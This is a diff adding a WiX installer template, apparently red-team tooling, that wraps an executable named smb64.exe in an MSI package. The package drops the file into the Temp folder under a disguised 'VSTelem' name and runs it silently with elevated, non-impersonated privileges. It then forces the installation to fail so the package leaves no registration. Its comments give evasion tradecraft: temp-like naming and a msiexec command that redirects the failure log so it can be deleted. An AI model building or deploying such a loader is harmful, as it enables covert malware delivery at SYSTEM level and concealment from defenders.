@@ -1,0 +1,77 @@
+<?xml version='1.0'?>
+<!--  
+    Sabri Hassanyah (@KINGSABRI)
+    https://stackoverflow.com/questions/854873/how-to-make-an-msi-that-simply-wraps-an-exe-file
+    https://serverfault.com/questions/11670/the-corporate-benefits-of-using-msi-files/274609#274609
+    https://isc.sans.edu/forums/diary/Malware+Delivered+via+Windows+Installer+Files/23349/
+    https://wixtoolset.org/documentation/manual/v3/xsd/wix/customaction.html
+-->
+
+<Wix xmlns='http://schemas.microsoft.com/wix/2006/wi'>
+   <Product Id='*' UpgradeCode="11111111-2222-3333-4444-555555555555" 
+        Name='My Setup' Language='1033' Version='1.0.0.0' 
+        Manufacturer='Your Company'>
+
+    <Package Description='pak' InstallerVersion='200' Compressed='yes' />
+    <Media Id='1' Cabinet='setup.cab' EmbedCab='yes' />
+    
+    <!-- use a better naming (temp-like naming convention) ex. 4b494e47.icu-->
+    <Directory Id='TARGETDIR' Name='SourceDir'>
+        <Directory Id="TempFolder">
+            <Directory Id="INSTALLLOCATION" Name="VSTelem"> 
+                <Component Id='MyComponent' DiskId='1' Guid=''>
+                    <File Id="File0" Name="smb64.exe" Source="smb64.exe" />
+                </Component>
+            </Directory>
+        </Directory>
+    </Directory> 
+    
+    <Feature Id='InstallFeature' Title='Install Feature' Level='1'>
+        <ComponentRef Id='MyComponent' />
+    </Feature> 
+   
+    <!-- Run Action -->
+    <CustomAction 
+        Id="RunWrapped" 
+        Execute="deferred" 
+        Directory="INSTALLLOCATION"
+        Impersonate="no" 
+        ExeCommand="[INSTALLLOCATION]smb64.exe"
+        Return="asyncNoWait" 
+    /> 
+    
+    <!-- 
+        Important Treadcraft: 
+        Although forcing MSI installation to fail saves us registring the package on the system,
+        It leaves a log file *C:\Users\<User>\AppData\Local\Temp\<RandomName>.log* for that failure on disk exposing details about the msi package
+        example.log: 
+        ```
+        Error 1721. There is a problem with this Windows Installer package. A program required for this install to complete could not be run. 
+        Contact your support personnel or package vendor. 
+        Action: MicrosoftWindowsSystemIncrementalUpdate, location: C:\Users\<User>\AppData\Local\Temp\<PATH>, command: C:\Users\<User>\AppData\Local\Temp\>PATH>\MicrosoftWindowsSystemIncrementalUpdate.exe 
+        === Logging stopped: 8/5/2020  12:23:06 ===
+        ```
+        To partially solve this issue, specify the log path (to the current path then delete it yourself), as the following
+        ```
+        msiexec /i malware.msi /qn /Lm deleteme.log
+        ```
+    -->
+    <CustomAction 
+        Id          ="Fail"                     
+        Directory   ="INSTALLLOCATION"
+        ExeCommand  ='[INSTALLLOCATION]Fail.exe'
+        Execute     ="deferred"
+        Impersonate ="no"
+        Return      ="check"
+    />
+
+    <!-- msf way -->
+  	<!-- <CustomAction Id='FailInstallation' Impersonate='no' Execute='deferred' Script='vbscript' Return='check'>fail</CustomAction> --> 
+
+    <!-- Comment out unwanted actions -->
+    <InstallExecuteSequence>
+        <Custom Action="RunWrapped" After="InstallFiles">NOT REMOVE~="ALL"</Custom>
+        <Custom Action="Fail" Before="InstallFinalize" /> 
+    </InstallExecuteSequence>
+   </Product>
+</Wix>
